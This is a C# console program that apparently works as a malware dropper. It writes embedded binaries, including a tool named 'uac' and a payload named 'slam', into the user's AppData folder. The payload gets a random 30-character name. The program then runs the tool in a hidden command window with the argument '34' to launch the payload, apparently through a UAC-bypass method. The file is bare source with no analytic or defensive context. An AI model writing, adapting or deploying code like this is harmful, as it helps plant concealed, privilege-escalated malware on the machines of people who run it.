using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Resources;
using System.CodeDom.Compiler;

namespace ConsoleApp2
{
    class Program
    {
        public string crearnombre(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();

        }
        static void Main(string[] args)
        {
            var mc = new Program();
            string nombre = mc.crearnombre(30);
            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            File.WriteAllBytes(path + @"\uac.exe", Properties.Resources.uac);
            File.WriteAllBytes(path + @"\" + nombre + ".exe", Properties.Resources.slam);
            File.WriteAllBytes(path + @"\ucrtbased.dll", Properties.Resources.ucrtbased);
            File.WriteAllBytes(path + @"\vcruntime140d.dll", Properties.Resources.vcruntime140d);
            ProcessStartInfo cds = new ProcessStartInfo();
            cds.FileName = @"cmd.exe";
            cds.WindowStyle = ProcessWindowStyle.Hidden;
            cds.Arguments = @"/c cd %appdata% & uac.exe 34 " + path + @"\" + nombre + ".exe";
            Process.Start(cds);
        }
    }
}